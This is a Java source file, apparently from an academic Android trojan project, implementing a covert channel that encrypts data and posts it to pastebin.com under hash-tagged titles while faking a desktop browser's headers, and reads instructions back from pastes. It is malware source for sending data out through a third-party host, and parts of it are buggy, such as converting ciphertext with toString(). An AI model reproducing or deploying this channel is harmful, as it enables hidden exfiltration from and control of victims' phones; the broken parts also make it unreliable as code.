package il.ac.colman.androidtrojan.Channels.PasteBin;

import il.ac.colman.androidtrojan.Channels.ICommunication;
import il.ac.colman.androidtrojan.Channels.PasteBin.hybenc.Decrypter;
import il.ac.colman.androidtrojan.Channels.PasteBin.hybenc.Encrypter;
import il.ac.colman.androidtrojan.Channels.PasteBin.hybenc.KeyFileGenerator;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URI;
import java.net.URL;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.util.Random;
import org.apache.http.Header;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import android.content.Context;


public class PasteBinChannel implements ICommunication {
	//Defines:
	static int LENGTH = 20;
	static String pkString = "keys/publicKeyFile";
	static String skString = "keys/secretKeyFile";


	//class fields:
	Context context;

	//ctor:
	public PasteBinChannel(Context context){
		this.context = context;
	}

	//class methods:
	@Override
	public String sendEncrypted(String paste, String current_hash_value) throws Exception{
		//encryption:
		// Create a pair of Secret and Public keys:
		PublicKey pk = KeyFileGenerator.readPublicKeyFromAsset(context.getAssets(), pkString);
		Encrypter enc = new Encrypter(pk);
		byte[] ciphertext = enc.encrypt(paste.getBytes());
		
		//sending to pastebin:
		return this.sendUnEncrypted(ciphertext.toString(), current_hash_value);
	}

	
	//***************************************************************************
	@Override
	public String reciveEncrypted(String key) throws Exception{
		String data = this.reciveUnEncrypted(key);
		// Encrypt message:
		PrivateKey sk = KeyFileGenerator.readPrivateKeyFromAsset(context.getAssets(), skString);
		Decrypter dec = new Decrypter(sk);
		byte[] plaintext = dec.decrypt(data.getBytes());

		//return the data:
		return plaintext.toString();
	}

	private static String GetValueInLineBetweenStrings(){
		try
		{
			//setting strings
			String beforeValue = "<input name=\"post_key\" value=\"";
			String AfterValue = "\"";
			int beforeValueLength = beforeValue.length();

			URL url = new URL("http://pastebin.com");       

			// Read all the text returned by the server
			BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
			String line;
			while ((line = in.readLine()) != null) {
				int beforeValueIndex = line.indexOf(beforeValue);
				int afterValueIndex = -1;
				if (beforeValueIndex != -1)
				{
					afterValueIndex = line.indexOf(AfterValue, beforeValueIndex + beforeValueLength);
					if (afterValueIndex == -1)
					{
						continue;
					}
				}
				else
					continue;

				return line.substring(beforeValueIndex + beforeValueLength, afterValueIndex);
			}
			in.close();
		}
		catch (Exception e){}
		return null;
	}


	@Override
	public String sendUnEncrypted(String value, String current_hash_value) throws Exception {
		//setting 
		String RI = current_hash_value;
		String fourRI = RI + " " + RI + " " + RI + " " + RI + " ";
		String template = fourRI + " \n %s \n\n Extra Tags " + fourRI + fourRI + fourRI + fourRI + fourRI + fourRI + fourRI + fourRI + fourRI + fourRI + fourRI + fourRI + fourRI + fourRI + fourRI;
		String headline = RI;

		//Post content:
		String content = String.format(template, value.toString());

		//*******************************************************************************
		//getting via HTML the post key validation process
		String postKey = GetValueInLineBetweenStrings();

		//setting the Http post request:
		HttpClient httpclient = new DefaultHttpClient();
		HttpPost httppost = new HttpPost(new URI("http://pastebin.com/post.php"));
		long arbitraryNumber = (long) (((new Random()).nextDouble() * 2.0 - 1.0) * Long.MAX_VALUE);
		String httpPostContent = String.format("-----------------------------"+ arbitraryNumber + "\n"
				+ "Content-Disposition: form-data; name=" + "\"" + "post_key" + "\" \n\n" + postKey + "\n"
				+ "-----------------------------" + arbitraryNumber + "\n"
				+ "Content-Disposition: form-data; name=" + "\"" + "submit_hidden" + "\"" + "\n\n" 
				+ "submit_hidden" + "\n" 
				+ "-----------------------------" + arbitraryNumber + "\n"
				+ "Content-Disposition: form-data; name=" + "\"" + "paste_code" + "\"" + "\n\n"
				+ content + "\n"
				+ "-----------------------------" + arbitraryNumber + "\n"
				+ "Content-Disposition: form-data; name=" + "\"" + "paste_format" + "\"" + "\n\n"
				+ "1" + "\n" 
				+ "-----------------------------" + arbitraryNumber + "\n" 
				+ "Content-Disposition: form-data; name=" + "\"" + "paste_expire_date" + "\"" + "\n\n" 
				+ "N" + "\n"
				+ "-----------------------------" + arbitraryNumber + "\n"
				+ "Content-Disposition: form-data; name=" + "\"" + "paste_private" + "\""  + "\n\n" 
				+ "0" + "\n"
				+ "-----------------------------" + arbitraryNumber + "\n"
				+ "Content-Disposition: form-data; name=" + "\"" + "paste_name"	+ "\"" + "\n\n" 
				+ headline + "\n" 
				+ "-----------------------------" + arbitraryNumber + "--");
		//setting the headers:
		httppost.setHeader("Method", "POST");
		httppost.setHeader("Host", "pastebin.com");
		httppost.setHeader("UserAgent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0");
		httppost.setHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
		httppost.setHeader("Accept-Language", "en-US,en;q=0.5");
		httppost.setHeader("Accept-Encoding", "gzip, deflate");
		httppost.setHeader("Referer", "http://pastebin.com/");
		httppost.setHeader("Content-Type", "multipart/form-data; boundary=---------------------------" + arbitraryNumber);
		httppost.setHeader("Cookie", "cookie_key=7; realuser=1;");
		//setting the entity in the http post request:
		StringEntity entity = new StringEntity(httpPostContent);
		httppost.setEntity(entity);

		//executing the requested post: 
		HttpResponse response = httpclient.execute(httppost);
		Header[] headers = response.getAllHeaders();

		//getting the right header with the result address:
		for (int i = 0; i < headers.length; i++) {
			if(headers[i].getName().equals("location"))
			{
				break;
			}
		}

		//returning the identifier:
		return RI;
	}

	@Override
	public String reciveUnEncrypted(String key) throws Exception {
		return DataPooler.getData(key);
	}

}
